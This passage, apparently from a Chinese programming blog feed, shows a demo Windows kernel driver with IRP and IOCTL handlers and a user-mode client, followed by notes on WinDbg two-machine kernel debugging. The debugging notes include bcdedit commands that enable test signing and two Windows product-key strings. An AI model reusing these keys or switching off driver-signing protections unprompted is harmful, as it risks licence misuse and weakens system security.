<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING DeviceName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MS-DOS 命名规范</span></span><br><span class="line">UNICODE_STRING DeviceName;</span><br><span class="line">UNICODE_STRING DosDeviceName;</span><br><span class="line">NTSTATUS status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\DeviceName&quot;</span>);</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DosDeviceName, <span class="string">L&quot;\\DosDevices\\DosDeviceName&quot;</span>);</span><br><span class="line">status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DosDeviceName, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">  <span class="comment">/* Symbolic link creation failed.  Handle error appropriately. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NT规范：每个设备接口类都与 GUID 相关联。KMDF 给的代码</span></span><br></pre></td></tr></table></figure>

<p>注册回调函数 <code>MajorFunction[IDX](IDX 代表注册读写函数，宏函数，不要超过最大值</code> ；IRP (I&#x2F;O Request Packet)；<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object">DRIVER_OBJECT (wdm.h) - Windows drivers </a>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_Use_decl_annotations_</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">DispatchXxx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _DEVICE_OBJECT  *DeviceObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _IRP  *Irp</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// Function body</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>删除符号</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoDeleteSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>删除设备</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoDeleteDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PDEVICE_OBJECT DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>IO框架</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_NAME <span class="string">L&quot;\\Device\\Demo&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINK_NAME <span class="string">L&quot;\\DosDevices\\Demo&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">IOCTL 控制码：</span></span><br><span class="line"><span class="comment">	I/O 控制代码是由多个字段组成的 32 位值。</span></span><br><span class="line"><span class="comment">	#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)</span></span><br><span class="line"><span class="comment">		DeviceType: 标识设备类型。 此值必须与在驱动程序DEVICE_OBJECT结构的 DeviceType 成员中设置的值匹配</span></span><br><span class="line"><span class="comment">		FunctionCode： 标识驱动程序要执行的函数。 小于 0x800 的值是为 Microsoft 保留的。 供应商可以使用 0x800 和更高值</span></span><br><span class="line"><span class="comment">	#define CTL_CODE(DeviceType, Function, Method, Access) (</span></span><br><span class="line"><span class="comment">				(DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method)</span></span><br><span class="line"><span class="comment">			)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)	\</span></span><br><span class="line"><span class="meta">	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Unload Driver\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回值并不代表成功，而是 pIrp-&gt;IoStatus.Status 代表IO是否成功</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchCommon</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; <span class="comment">// IRP记录这次操作是否成功</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;         <span class="comment">// Information用来记录实际传输的字节数的.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;DispatchCommon\r\n&quot;</span>));</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;                  <span class="comment">// 上面的 STATUS_SUCCESS是给R3看的.现在的返回时给IO管理器系统的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchRead</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PVOID pReadBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uReadLength = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pStack = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uMin = <span class="number">0</span>;</span><br><span class="line">	ULONG uHelloStr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	uHelloStr = (<span class="built_in">wcslen</span>(<span class="string">L&quot;Hello World&quot;</span>) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">	pReadBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer; <span class="comment">//缓冲区</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取IRP堆栈.我们说过3环调用0环.需要封装在IRP结构中.windows是分层驱动.所以IRP头部是共用的.其余的是栈传递.</span></span><br><span class="line">	pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">	uReadLength = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">	uMin = uReadLength &gt; uHelloStr ? uHelloStr : uReadLength;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlCopyMemory</span>(pReadBuffer, <span class="string">L&quot;Hello World&quot;</span>, uMin); <span class="comment">//拷贝到缓冲区中给3环.</span></span><br><span class="line"></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = uMin;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchWrite</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PVOID pWriteBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uWriteLength = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack = <span class="literal">NULL</span>;</span><br><span class="line">	PVOID pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//获取IRP堆栈</span></span><br><span class="line">	pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取写的长度.</span></span><br><span class="line">	uWriteLength = pIrpStack-&gt;Parameters.Write.Length;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pWriteBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">//申请内存.</span></span><br><span class="line">	pBuffer = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, uWriteLength, <span class="string">&#x27;DEMO&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		pIrp-&gt;IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">		pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">		<span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlZeroMemory</span>(pBuffer, uWriteLength);</span><br><span class="line">	<span class="comment">//拷贝到0环缓冲区</span></span><br><span class="line">	<span class="built_in">RtlCopyMemory</span>(pBuffer, pWriteBuffer, uWriteLength);</span><br><span class="line">	<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Write %s\r\n&quot;</span>, (PCHAR)pBuffer));</span><br><span class="line">	<span class="built_in">ExFreePool</span>(pBuffer);</span><br><span class="line">	pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = uWriteLength;</span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//内核中共享 SystemBuffer 有时间差.先读在写.</span></span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	PVOID InPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	PVOID OutPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uInPutLength = <span class="number">0</span>;</span><br><span class="line">	ULONG uOutPutBufferLength = <span class="number">0</span>;</span><br><span class="line">	ULONG IoCtrl = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	InPutBuffer = OutPutBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line">	IoCtrl = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;  <span class="comment">//获取控制码.</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span>(IoCtrl)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> CTL_HELLO:</span><br><span class="line">			<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;IOCTL HelloWorld\r\n&quot;</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRigisterEntry)</span> </span>&#123;</span><br><span class="line">	UNICODE_STRING uDevName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	UNICODE_STRING uLinkName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	PDEVICE_OBJECT pDevObj;</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;uDevName, DRIVER_NAME);</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;uLinkName, LINK_NAME);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Init Driver\r\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	status = <span class="built_in">IoCreateDevice</span>(pDriverObject, <span class="number">0</span>, &amp;uDevName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, FALSE, &amp;pDevObj);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateDevice\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 不是这个=&gt;蓝屏</span></span><br><span class="line">	pDevObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;uLinkName, &amp;uDevName);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateSymbolicLink\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">IoDeleteDevice</span>(pDevObj);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// IO </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		pDriverObject-&gt;MajorFunction[i] = DispatchCommon;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Read Write IOCTL</span></span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_READ] = DispatchRead;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = DispatchWrite;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;[+] Create Driver Success\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="R3"><a href="#R3" class="headerlink" title="R3"></a>R3</h4><p>在用户模式下打开 <code>\\DosDevices\\DosDeviceName</code> 设备，请在打开文件名时指定 <code>\\.\</code>，需要转义符</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\DosDeviceName&quot;</span>,</span><br><span class="line">	GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>


<p>通过<code>ReadFile</code>和 <code>WriteFile</code> 系统调用进行读写，ioctl使用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeviceIoControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                HANDLE       hDevice,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        dwIoControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID       lpInBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nInBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPVOID       lpOutBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nOutBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPDWORD      lpBytesReturned,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>交互</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)	\</span></span><br><span class="line"><span class="meta">	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile = <span class="built_in">CreateFileW</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\Demo&quot;</span>),</span><br><span class="line">		GENERIC_WRITE | GENERIC_READ,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	TCHAR szBuff[<span class="number">0X100</span>];</span><br><span class="line">	DWORD dwBytes = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hFile, szBuff, <span class="built_in">sizeof</span>(szBuff) / <span class="built_in">sizeof</span>(szBuff[<span class="number">0</span>]), &amp;dwBytes, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bytes:%d data:%ls\n&quot;</span>, dwBytes, szBuff);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hFile,</span><br><span class="line">		CTL_HELLO,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, </span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>关于 DEBUG 问题，常见 <code>DbgPrint</code>, <code>DbgPrintEx</code>。<code>KdPrintEx</code>这种是宏表示。Ex 函数为了更好的打印出调试信息（消息过滤机制：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/reading-and-filtering-debugging-messages">读取和筛选调试消息 - Windows drivers</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KdPrintEx(_x_) DbgPrintEx _x_ </span></span><br><span class="line"><span class="function">NTSYSAPI ULONG <span class="title">DbgPrintEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG ComponentId,      <span class="comment">// 避免将驱动程序的输出与 Windows 组件的输出混合</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Level,            <span class="comment">// 指定要发送的消息的严重性</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PCSTR Format,</span></span></span><br><span class="line"><span class="params"><span class="function">       ...   </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// DPF: Debug Print Filter</span></span><br><span class="line"><span class="comment">// IHV: Independent Hardware Vendor</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>));  <span class="comment">// 需要双括号</span></span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>);</span><br></pre></td></tr></table></figure>


<p>WDF…</p>
<p>驱动写出BUG直接蓝屏😢</p>
<h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><h3 id="Rtl"><a href="#Rtl" class="headerlink" title="Rtl"></a>Rtl</h3><p>Windows的Runtime Library（Rtl）函数是一组供Windows操作系统内部使用的函数。它们是由微软提供的低级别函数，用于执行操作系统管理功能，如内存管理、进程和线程管理、文件操作、设备驱动程序和底层交互等。</p>
<p>这些Rtl函数主要用于Windows内核和系统级驱动程序开发，不是普通应用程序开发人员常用的函数库。它们提供了一些高级别函数和抽象层，以方便开发人员与底层操作系统交互和管理。</p>
<h3 id="nt"><a href="#nt" class="headerlink" title="nt"></a>nt</h3><p>Windows NT是一个基于内核的操作系统系列，最初由微软公司在20世纪90年代开发和推出。NT代表”New Technology”（新技术），它的设计目标是提供一种稳定、可靠、安全的操作系统平台。</p>
<p>一些常见的Windows NT库：</p>
<ol>
<li>Kernel32.lib：这是Windows NT内核库，提供了许多系统级别的函数和工具，包括内存管理、进程和线程管理、文件和I&#x2F;O操作、时间和日期处理等。</li>
<li>User32.lib：这是用户界面库，提供了与用户界面相关的函数，如窗口管理、消息处理、菜单操作、图形设备接口等。</li>
</ol>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 双机调试</title>
    <url>/2024/01/18/Windows%20%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<blockquote>
<p>如何调试内核</p>
</blockquote>
<span id="more"></span>
<h2 id="windows-vm"><a href="#windows-vm" class="headerlink" title="windows vm"></a>windows vm</h2><h3 id="win10-11-虚拟机"><a href="#win10-11-虚拟机" class="headerlink" title="win10&#x2F;11 虚拟机"></a>win10&#x2F;11 虚拟机</h3><p>安装好VM，禁止系统更新，避免gadget地址改变。</p>
<p>神奇的字符串，不知道为什么出现在这里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KH2J9-PC326-T44D4-39H6V-TVPBY   // 10</span><br><span class="line">BCQNW-3VWYB-4V7QD-M6R2B-7MH26   // 11</span><br></pre></td></tr></table></figure>

<h3 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h3><h4 id="符号信息"><a href="#符号信息" class="headerlink" title="符号信息"></a>符号信息</h4><p>WinDbg preview –&gt; File –&gt; setting –&gt; debugging setting –&gt; default symbol path</p>
<ul>
<li>如果在指定的目录找不到，就会远程下载</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">srv*C:\Symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>

<h4 id="双机调试"><a href="#双机调试" class="headerlink" title="双机调试"></a>双机调试</h4><h5 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h5><p>WinDbg 双机调试内核。</p>
<ul>
<li>虚拟机添加一个串行端口，选择命名管道，这个命名管道形式如：<code>\\.\pipe\com_1</code>，选择该端是服务，另一端是应用程序</li>
<li>windbg 选择 attach to kernel</li>
</ul>
<p>待调试机器：添加一个串口设备，使用命名的管道；开机后管理员开启cmd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bcdedit /dbgsettings serial baudrate:115200 debugport:1</span><br><span class="line">bcdedit /copy &quot;&#123;current&#125;&quot; /d WinDebug        # 这一步成功会生成一个引导项，打印出其uuid</span><br><span class="line">bcdedit /displayorder &quot;&#123;current&#125;&quot; &quot;&#123;uuid&#125;&quot;  # 指定开机进入上一步的引导项</span><br><span class="line">bcdedit /debug &quot;&#123;uuid&#125;&quot; on                # 开启debug</span><br></pre></td></tr></table></figure>

<p>调试机器：windbg attach kernel，填内容</p>
<ul>
<li>波特率：115200</li>
<li>管道：待调试机器的命名管道</li>
<li>resets: 0</li>
</ul>
<p>也可使用 也可  <code>win+r</code> 运行 msconfig</p>
<h5 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h5><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-network-debugging-connection">Set up KDNET network kernel debugging manually</a></p>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings net hostip:w.x.y.z port:n</span><br><span class="line">shutdown <span class="literal">-r</span> <span class="literal">-t</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>打开签名认证开关</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit/<span class="built_in">set</span> testsigning on</span><br></pre></td></tr></table></figure>


<p>显示为 <code>Debuggee is running...</code>，后来才知道需要点击顶栏 <code>break</code> 进行断点</p>
<p>还可以使用 <code>VS</code> 调试。</p>
<p>参考：<a href="https://bbs.kanxue.com/thread-261326.htm">双机内核调试</a></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>git work-flows</title>
    <url>/2023/11/20/git%20work-flow/</url>
    <content><![CDATA[<blockquote>
<p>git工作流，持续踩坑</p>
</blockquote>
<span id="more"></span>

<p>因为我同时使用两个操作昔日，因此github仓库就产生一个同步的问题。但是只会 <code>add commit push</code> 三步，因此学习一下</p>
